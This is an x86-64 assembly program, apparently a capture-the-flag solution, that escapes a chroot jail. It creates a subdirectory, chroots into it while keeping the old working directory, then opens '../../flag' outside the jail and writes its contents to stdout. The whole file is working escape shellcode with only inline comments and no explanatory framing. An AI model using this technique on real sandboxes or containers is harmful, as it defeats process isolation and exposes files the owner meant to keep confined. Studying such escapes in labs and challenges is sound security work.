.global _start
.intel_syntax noprefix

_start:
    # Create a new directory inside the jail
    lea rdi, [rip + new_dir]
    xor rsi, rsi                # mode
    mov rax, 83                 # mkdir syscall number
    syscall

    # Chroot to the new directory
    lea rdi, [rip + new_dir]
    mov rax, 161                # chroot syscall number
    syscall

    # Open the flag file
    lea rdi, [rip + flag_path]
    xor rsi, rsi                # flags (O_RDONLY)
    xor rdx, rdx                # mode
    mov rax, 2                  # open syscall number
    syscall

    # Check if open was successful
    test rax, rax
    js exit                     # jump to exit if open failed

    # Save file descriptor
    mov rdi, rax

    # Read the flag file
    lea rsi, [rip + buffer]
    mov rdx, 100                # read up to 100 bytes
    mov rax, 0                  # read syscall number
    syscall

    # Write to stdout
    mov rdi, 1                  # stdout
    lea rsi, [rip + buffer]
    mov rdx, rax                # number of bytes read
    mov rax, 1                  # write syscall number
    syscall

exit:
    # Exit
    xor rdi, rdi                # exit code 0
    mov rax, 60                 # exit syscall number
    syscall

new_dir:
    .string "new_dir"

flag_path:
    .string "../../flag"

buffer:
    .space 100
